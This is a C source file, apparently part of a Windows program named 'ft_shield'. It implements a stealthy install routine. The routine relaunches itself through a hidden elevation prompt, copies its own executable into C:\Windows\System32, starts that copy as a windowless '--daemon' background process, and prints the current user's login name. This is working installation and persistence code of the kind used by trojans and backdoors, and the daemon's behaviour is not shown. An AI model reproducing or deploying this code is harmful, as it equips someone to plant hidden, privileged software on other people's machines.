
#include "ft_shield.h"
#include <lmcons.h>
#include <stdio.h>

#define INSTALL_PATH "C:\\Windows\\System32\\ft_shield.exe"
#define INSTALL_PATH_W L"C:\\Windows\\System32\\ft_shield.exe"

static int copy_self(const char *dst)
{
    char *src;

    src = get_my_path();
    if (src == NULL)
    {
        return (0);
    }
    if (!CopyFileA(src, dst, FALSE) && GetLastError() != ERROR_FILE_EXISTS)
    {
        return (0);
    }
    return (1);
}

int spawn_elevated(void)
{
    char path[MAX_PATH];
    SHELLEXECUTEINFOA info = {0};

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
        return (0);
    info.cbSize = sizeof(info);
    info.lpVerb = "runas";
    info.lpFile = path;
    info.nShow = SW_HIDE;
    if (!ShellExecuteExA(&info))
        return (0);
    return (1);
}

static int spawn_daemon(void){
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    WCHAR command_line[] = L"\"" INSTALL_PATH_W L"\" --daemon";

    si.cb = sizeof(si);
    if (!CreateProcessW(INSTALL_PATH_W, command_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi))
    {
        return (0);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return (1);
}

int mode_normal(void)
{
    char login[UNLEN + 1];
    DWORD size = sizeof(login);

    if (is_elevated() <= 0)
        return (spawn_elevated());
    if (!GetUserNameA(login, &size))
    {
        return (0);
    }
    if (!copy_self(INSTALL_PATH) || !spawn_daemon())
        return (1);
    printf("%s\n", login);
    return (1);
}
